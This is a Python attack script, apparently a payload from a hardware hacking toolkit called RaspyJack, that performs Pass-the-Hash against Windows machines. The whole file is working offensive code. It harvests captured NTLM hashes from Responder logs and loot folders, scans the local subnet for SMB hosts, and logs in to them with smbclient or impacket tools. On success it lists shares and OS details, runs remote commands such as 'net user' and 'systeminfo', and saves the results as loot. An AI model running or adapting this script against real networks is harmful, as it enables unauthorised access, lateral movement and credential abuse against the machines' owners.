#!/usr/bin/env python3
# @name: Pass the Hash (PtH)
# @desc: Uses captured NTLM hashes to authenticate to other Windows machines via SMB (port 445).
# @category: credentials
# @danger: true
# @active: true
# @web: true
"""
RaspyJack Payload -- Pass the Hash (PtH)
=========================================
Author: 7h30th3r0n3

Uses captured NTLM hashes to authenticate to other Windows machines
via SMB (port 445).  Leverages smbclient --pw-nt-hash or impacket
tools (psexec.py / smbexec.py / wmiexec.py) when available.

Setup / Prerequisites:
  - Captured hashes in Responder logs or loot directories.
  - smbclient or impacket tools installed.

Steps:
  1) Collect NTLM hashes from loot dirs and Responder logs
  2) Auto-discover Windows hosts (port 445 open), or use a given target
  3) Attempt authentication with the selected hash
  4) Enumerate shares, OS version, logged users on success
  5) Optionally execute a predefined safe command

Controls:
  python3 pass_the_hash.py [target_ip] [hash_user] [command]

  target_ip  -- optional. If omitted, the local /24 is scanned for
                hosts with port 445 open and you're prompted to pick
                one. If given, authentication is attempted directly
                against that host (no discovery scan).
  hash_user  -- optional. Selects a collected hash by list index or
                by matching username. If omitted, you're prompted to
                pick one from a numbered list.
  command    -- optional. One of the predefined safe commands to run
                on success (e.g. "whoami"). If omitted and auth
                succeeds, you're prompted to pick one (blank to skip).

Loot: $CITYPOP_ROOT/loot/PtH/
"""

from payloads._web_input import request_input
import os
import sys
import re
import json
import time
import socket
import threading
import subprocess
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
LOOT_DIR = os.path.join(os.environ.get("CITYPOP_ROOT", os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))), 'loot', 'PtH')
CRACKED_DIR = os.path.join(os.environ.get("CITYPOP_ROOT", os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))), 'loot', 'CrackedNTLM')
RELAY_DIR = os.path.join(os.environ.get("CITYPOP_ROOT", os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))), 'loot', 'NTLMRelay')
RESPONDER_LOG_DIR = os.path.join(os.environ.get("CITYPOP_ROOT", os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))), 'Responder', 'logs')

PORT_445_TIMEOUT = 0.8
SCAN_THREADS = 20

SAFE_COMMANDS = [
    "whoami",
    "ipconfig /all",
    "net user",
    "net localgroup administrators",
    "systeminfo",
    "hostname",
]

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
collected_hashes = []       # [{user, domain, nt_hash, source, full_line}]
targets = []                # [{ip, status, os_info, shares}]
hash_idx = 0
status_msg = "Initializing..."
auth_results = []           # [{ip, user, success, shares, os_info, users}]
last_cmd_output = ""


# ---------------------------------------------------------------------------
# Hash parsing
# ---------------------------------------------------------------------------

def _parse_ntlm_hash_line(line, source_name):
    """Parse a single NTLM hash line and return a dict or None.

    Supported formats:
      user::domain:challenge:response:response   (NTLMv2 / Responder)
      user:rid:lm_hash:nt_hash:::              (SAM dump)
      user:nt_hash                              (simple)
    """
    line = line.strip()
    if not line or line.startswith("#"):
        return None

    parts = line.split(":")

    # NTLMv2 format: user::domain:challenge:response:response
    if len(parts) >= 6 and parts[1] == "":
        user = parts[0]
        domain = parts[2]
        nt_hash = line  # full line is the hash for relay
        return {
            "user": user[:32],
            "domain": domain[:32],
            "nt_hash": nt_hash,
            "source": source_name,
            "full_line": line,
        }

    # SAM dump: user:rid:lm_hash:nt_hash:::
    if len(parts) >= 4:
        user = parts[0]
        candidate = parts[3]
        if re.fullmatch(r"[0-9a-fA-F]{32}", candidate):
            return {
                "user": user[:32],
                "domain": ".",
                "nt_hash": candidate,
                "source": source_name,
                "full_line": line,
            }

    # Simple: user:hash
    if len(parts) == 2:
        user = parts[0]
        candidate = parts[1]
        if re.fullmatch(r"[0-9a-fA-F]{32}", candidate):
            return {
                "user": user[:32],
                "domain": ".",
                "nt_hash": candidate,
                "source": source_name,
                "full_line": line,
            }

    return None


def _collect_hashes_from_dir(dirpath, patterns=None):
    """Scan a directory for hash files and parse them."""
    found = []
    if not os.path.isdir(dirpath):
        return found
    try:
        for fname in sorted(os.listdir(dirpath)):
            fpath = os.path.join(dirpath, fname)
            if not os.path.isfile(fpath):
                continue
            if not fname.endswith((".txt", ".json")):
                continue
            if patterns is not None:
                if not any(p.lower() in fname.lower() for p in patterns):
                    continue
            try:
                with open(fpath, "r", errors="replace") as fh:
                    for line in fh:
                        entry = _parse_ntlm_hash_line(line, fname)
                        if entry is not None:
                            found.append(entry)
            except Exception:
                pass
    except Exception:
        pass
    return found


def collect_all_hashes():
    """Gather hashes from all known loot locations."""
    global collected_hashes, status_msg

    with lock:
        status_msg = "Collecting hashes..."

    all_found = []

    # Cracked NTLM passwords (may contain user:password pairs)
    all_found.extend(_collect_hashes_from_dir(CRACKED_DIR))

    # Raw relay hashes
    all_found.extend(_collect_hashes_from_dir(RELAY_DIR))

    # Responder logs
    all_found.extend(_collect_hashes_from_dir(
        RESPONDER_LOG_DIR,
        patterns=["NTLM", "SMB", "HTTP"],
    ))

    # Deduplicate by (user, nt_hash)
    seen = set()
    deduped = []
    for entry in all_found:
        key = (entry["user"].lower(), entry["nt_hash"][:64])
        if key not in seen:
            seen.add(key)
            deduped.append(entry)

    with lock:
        collected_hashes = deduped
        status_msg = f"Found {len(deduped)} hashes"


# ---------------------------------------------------------------------------
# Host discovery (port 445 scan)
# ---------------------------------------------------------------------------

def _check_port_445(ip, results_list, results_lock):
    """Check if port 445 is open on a single IP."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(PORT_445_TIMEOUT)
        result = sock.connect_ex((ip, 445))
        sock.close()
        if result == 0:
            with results_lock:
                results_list.append({
                    "ip": ip,
                    "status": "open",
                    "os_info": "",
                    "shares": [],
                })
    except Exception:
        pass


def _get_local_subnet():
    """Detect the local /24 subnet prefix."""
    try:
        result = subprocess.run(
            ["ip", "-4", "route", "show", "default"],
            capture_output=True, text=True, timeout=5,
        )
        for line in result.stdout.splitlines():
            parts = line.split()
            if "via" in parts:
                gw_idx = parts.index("via") + 1
                if gw_idx < len(parts):
                    gw = parts[gw_idx]
                    octets = gw.split(".")
                    if len(octets) == 4:
                        return ".".join(octets[:3])
    except Exception:
        pass
    return "192.168.1"


def discover_targets():
    """Scan local /24 for hosts with port 445 open."""
    global targets, status_msg

    with lock:
        status_msg = "Scanning for SMB hosts..."

    subnet = _get_local_subnet()
    print(f"[*] Scanning {subnet}.0/24 for SMB hosts (port 445)...", flush=True)
    found = []
    found_lock = threading.Lock()
    threads = []

    for i in range(1, 255):
        ip = f"{subnet}.{i}"
        t = threading.Thread(
            target=_check_port_445,
            args=(ip, found, found_lock),
            daemon=True,
        )
        threads.append(t)
        t.start()
        # Throttle thread creation
        if len(threads) >= SCAN_THREADS:
            for th in threads:
                th.join(timeout=PORT_445_TIMEOUT + 0.5)
            threads.clear()

    # Wait for remaining threads
    for th in threads:
        th.join(timeout=PORT_445_TIMEOUT + 0.5)

    # Sort by IP
    found.sort(key=lambda h: tuple(int(o) for o in h["ip"].split(".")))

    with lock:
        targets = found
        status_msg = f"Found {len(found)} SMB hosts"


# ---------------------------------------------------------------------------
# Tool detection
# ---------------------------------------------------------------------------

def _find_tool(names):
    """Find the first available tool from a list of names/paths."""
    search_paths = [
        "/usr/bin", "/usr/local/bin", "/usr/sbin",
        "/usr/share/doc/python3-impacket/examples",
        "/opt/impacket/examples",
    ]
    for name in names:
        # Absolute path
        if os.path.isfile(name):
            return name
        # Search common locations
        for base in search_paths:
            candidate = os.path.join(base, name)
            if os.path.isfile(candidate):
                return candidate
    return None


def _has_smbclient():
    """Check if smbclient is available."""
    return _find_tool(["smbclient"]) is not None


def _find_impacket_tool(tool_name):
    """Find an impacket tool (e.g. psexec.py, wmiexec.py)."""
    return _find_tool([
        tool_name,
        f"impacket-{tool_name.replace('.py', '')}",
    ])


# ---------------------------------------------------------------------------
# Authentication via smbclient
# ---------------------------------------------------------------------------

def _auth_smbclient(ip, user, domain, nt_hash):
    """Attempt PtH authentication via smbclient --pw-nt-hash."""
    smbclient = _find_tool(["smbclient"])
    if smbclient is None:
        return None

    # Only use raw 32-char NT hashes for --pw-nt-hash
    clean_hash = nt_hash.strip()
    if not re.fullmatch(r"[0-9a-fA-F]{32}", clean_hash):
        return None

    user_arg = f"{domain}\\{user}" if domain and domain != "." else user

    try:
        result = subprocess.run(
            [
                smbclient, "-L", ip,
                "-U", f"{user_arg}%{clean_hash}",
                "--pw-nt-hash",
                "-t", "10",
            ],
            capture_output=True, text=True, timeout=15,
        )
        output = result.stdout + result.stderr

        if "NT_STATUS_LOGON_FAILURE" in output:
            return None
        if "NT_STATUS_ACCESS_DENIED" in output:
            return None

        # Parse share listing
        shares = []
        for line in result.stdout.splitlines():
            match = re.match(r"\s+(\S+)\s+(Disk|IPC|Printer)", line)
            if match:
                shares.append(match.group(1))

        return {"shares": shares, "raw": output[:256]}

    except (subprocess.TimeoutExpired, Exception):
        return None


# ---------------------------------------------------------------------------
# Authentication via impacket
# ---------------------------------------------------------------------------

def _auth_impacket(ip, user, domain, nt_hash):
    """Attempt PtH authentication via impacket tools."""
    for tool_name in ["psexec.py", "smbexec.py", "wmiexec.py"]:
        tool_path = _find_impacket_tool(tool_name)
        if tool_path is None:
            continue

        clean_hash = nt_hash.strip()
        if not re.fullmatch(r"[0-9a-fA-F]{32}", clean_hash):
            continue

        # LM:NT hash format for impacket
        hash_arg = f"aad3b435b51404eeaad3b435b51404ee:{clean_hash}"
        domain_part = domain if domain and domain != "." else "."
        target = f"{domain_part}/{user}@{ip}"

        try:
            result = subprocess.run(
                [
                    "python3", tool_path,
                    "-hashes", hash_arg,
                    target,
                    "whoami",
                ],
                capture_output=True, text=True, timeout=20,
            )
            output = result.stdout + result.stderr

            if "LOGON_FAILURE" in output or "STATUS_ACCESS_DENIED" in output:
                continue

            if result.returncode == 0 or "whoami" in output.lower():
                return {
                    "tool": tool_name,
                    "raw": output[:256],
                }
        except (subprocess.TimeoutExpired, Exception):
            continue

    return None


# ---------------------------------------------------------------------------
# Enumeration
# ---------------------------------------------------------------------------

def _enumerate_target(ip, user, domain, nt_hash):
    """Enumerate shares, OS info, and logged users on a target."""
    info = {"shares": [], "os_info": "", "users": []}

    # Shares via smbclient
    smb_result = _auth_smbclient(ip, user, domain, nt_hash)
    if smb_result is not None:
        info["shares"] = smb_result.get("shares", [])

    # OS info via smbclient
    smbclient = _find_tool(["smbclient"])
    if smbclient is not None:
        clean_hash = nt_hash.strip()
        if re.fullmatch(r"[0-9a-fA-F]{32}", clean_hash):
            user_arg = f"{domain}\\{user}" if domain != "." else user
            try:
                result = subprocess.run(
                    [
                        smbclient, f"//{ip}/IPC$",
                        "-U", f"{user_arg}%{clean_hash}",
                        "--pw-nt-hash",
                        "-c", "exit",
                        "-t", "10",
                    ],
                    capture_output=True, text=True, timeout=15,
                )
                for line in (result.stdout + result.stderr).splitlines():
                    if "OS=" in line or "Server" in line:
                        info["os_info"] = line.strip()[:64]
                        break
            except Exception:
                pass

    return info


# ---------------------------------------------------------------------------
# Command execution
# ---------------------------------------------------------------------------

def _execute_command(ip, user, domain, nt_hash, command):
    """Execute a predefined command on the target via impacket."""
    clean_hash = nt_hash.strip()
    if not re.fullmatch(r"[0-9a-fA-F]{32}", clean_hash):
        return "Error: invalid hash format"

    hash_arg = f"aad3b435b51404eeaad3b435b51404ee:{clean_hash}"
    domain_part = domain if domain and domain != "." else "."
    target = f"{domain_part}/{user}@{ip}"

    for tool_name in ["wmiexec.py", "smbexec.py", "psexec.py"]:
        tool_path = _find_impacket_tool(tool_name)
        if tool_path is None:
            continue
        try:
            result = subprocess.run(
                [
                    "python3", tool_path,
                    "-hashes", hash_arg,
                    target,
                    command,
                ],
                capture_output=True, text=True, timeout=30,
            )
            output = result.stdout.strip()
            if output:
                return output[:512]
        except subprocess.TimeoutExpired:
            return "Timeout"
        except Exception as exc:
            return f"Error: {str(exc)[:60]}"

    return "No impacket tools found"


# ---------------------------------------------------------------------------
# PtH attempt (orchestrator)
# ---------------------------------------------------------------------------

def do_pth_attempt(target_ip):
    """Run PtH against a target with the currently selected hash."""
    global status_msg, auth_results

    with lock:
        if not collected_hashes:
            status_msg = "No hashes loaded"
            return
        h = dict(collected_hashes[hash_idx])
        status_msg = f"Auth {h['user'][:8]}@{target_ip}..."

    print(f"[*] Attempting {h['user']}@{h['domain']} -> {target_ip}...", flush=True)

    # Try smbclient first, then impacket
    smb_result = _auth_smbclient(
        target_ip, h["user"], h["domain"], h["nt_hash"],
    )
    success = smb_result is not None

    if not success:
        imp_result = _auth_impacket(
            target_ip, h["user"], h["domain"], h["nt_hash"],
        )
        success = imp_result is not None

    # Enumerate on success
    enum_info = {"shares": [], "os_info": "", "users": []}
    if success:
        enum_info = _enumerate_target(
            target_ip, h["user"], h["domain"], h["nt_hash"],
        )

    entry = {
        "ip": target_ip,
        "user": h["user"],
        "domain": h["domain"],
        "success": success,
        "shares": enum_info.get("shares", []),
        "os_info": enum_info.get("os_info", ""),
        "users": enum_info.get("users", []),
        "timestamp": datetime.now().isoformat(),
    }

    with lock:
        # Replace existing entry for same ip+user or append
        replaced = False
        new_results = []
        for r in auth_results:
            if r["ip"] == target_ip and r["user"] == h["user"]:
                new_results.append(entry)
                replaced = True
            else:
                new_results.append(r)
        if not replaced:
            new_results.append(entry)
        auth_results = new_results

        if success:
            shares_str = ",".join(enum_info.get("shares", [])[:3])
            status_msg = f"SUCCESS {target_ip} [{shares_str[:16]}]"
        else:
            status_msg = f"FAIL {target_ip}"

    print(f"[{'+' if success else '-'}] {status_msg}", flush=True)

    # Auto-save results
    _save_results()


# ---------------------------------------------------------------------------
# Save results
# ---------------------------------------------------------------------------

def _save_results():
    """Save PtH results to loot directory."""
    os.makedirs(LOOT_DIR, exist_ok=True)
    with lock:
        data = list(auth_results)
    if not data:
        return None

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(LOOT_DIR, f"pth_{ts}.json")
    with open(path, "w") as fh:
        json.dump(data, fh, indent=2)
    return path


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global hash_idx, last_cmd_output

    if "-h" in sys.argv or "--help" in sys.argv:
        print("Usage: python3 pass_the_hash.py [target_ip] [hash_user] [command]",
              flush=True)
        return 0

    args = sys.argv[1:]
    target_arg = args[0] if len(args) > 0 else None
    hash_arg = args[1] if len(args) > 1 else None
    cmd_arg = args[2] if len(args) > 2 else None

    print("[*] Pass the Hash -- collecting hashes...", flush=True)
    collect_all_hashes()
    with lock:
        hashes = list(collected_hashes)

    if not hashes:
        print("[!] No NTLM hashes found in loot dirs or Responder logs.", flush=True)
        return 1

    print(f"[*] Found {len(hashes)} hash(es):", flush=True)
    for i, h in enumerate(hashes, 1):
        print(f"  {i}. {h['user']}@{h['domain']} (src={h['source']})", flush=True)

    # --- Select hash ---
    selected = None
    if hash_arg:
        try:
            idx = int(hash_arg) - 1
            if 0 <= idx < len(hashes):
                selected = idx
        except ValueError:
            for i, h in enumerate(hashes):
                if h["user"].lower() == hash_arg.lower():
                    selected = i
                    break
        if selected is None:
            print(f"[!] '{hash_arg}' did not match a hash, prompting instead.", flush=True)

    if selected is None:
        choice = request_input(f"Select a hash [1-{len(hashes)}]: ").strip()
        try:
            selected = int(choice) - 1
            if selected < 0 or selected >= len(hashes):
                raise ValueError
        except ValueError:
            print("[!] Invalid selection.", flush=True)
            return 1

    hash_idx = selected
    h = hashes[hash_idx]
    print(f"[*] Selected: {h['user']}@{h['domain']}", flush=True)

    # --- Select target ---
    try:
        if target_arg:
            target_ip = target_arg
        else:
            discover_targets()
            with lock:
                tgts = list(targets)
            if not tgts:
                print("[!] No SMB hosts found. Pass a target IP as an argument instead.",
                      flush=True)
                return 1
            print(f"[*] Discovered {len(tgts)} SMB host(s):", flush=True)
            for i, t in enumerate(tgts, 1):
                print(f"  {i}. {t['ip']}", flush=True)
            choice = request_input(f"Select a target [1-{len(tgts)}]: ").strip()
            try:
                idx = int(choice) - 1
                if idx < 0 or idx >= len(tgts):
                    raise ValueError
            except ValueError:
                print("[!] Invalid selection.", flush=True)
                return 1
            target_ip = tgts[idx]["ip"]

        do_pth_attempt(target_ip)

        with lock:
            entry = next(
                (r for r in auth_results if r["ip"] == target_ip and r["user"] == h["user"]),
                None,
            )

        if entry and entry["success"]:
            if entry.get("shares"):
                print(f"[*] Shares: {', '.join(entry['shares'])}", flush=True)
            if entry.get("os_info"):
                print(f"[*] OS info: {entry['os_info']}", flush=True)

            # --- Optionally execute a command ---
            command = None
            if cmd_arg:
                matches = [c for c in SAFE_COMMANDS if c.lower() == cmd_arg.lower()]
                if matches:
                    command = matches[0]
                else:
                    print(f"[!] Unknown command '{cmd_arg}'. Choices: "
                          f"{', '.join(SAFE_COMMANDS)}", flush=True)
            else:
                print("Available commands:", flush=True)
                for i, cmd in enumerate(SAFE_COMMANDS, 1):
                    print(f"  {i}. {cmd}", flush=True)
                choice = request_input(
                    f"Run a command [1-{len(SAFE_COMMANDS)}] (blank to skip): "
                ).strip()
                if choice:
                    try:
                        idx = int(choice) - 1
                        if 0 <= idx < len(SAFE_COMMANDS):
                            command = SAFE_COMMANDS[idx]
                    except ValueError:
                        print("[!] Invalid selection, skipping command.", flush=True)

            if command:
                print(f"[*] Running: {command}", flush=True)
                output = _execute_command(
                    target_ip, h["user"], h["domain"], h["nt_hash"], command,
                )
                last_cmd_output = output
                print(f"[*] Output:\n{output}", flush=True)

    except KeyboardInterrupt:
        print("\n[*] Interrupted.", flush=True)
    finally:
        _save_results()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
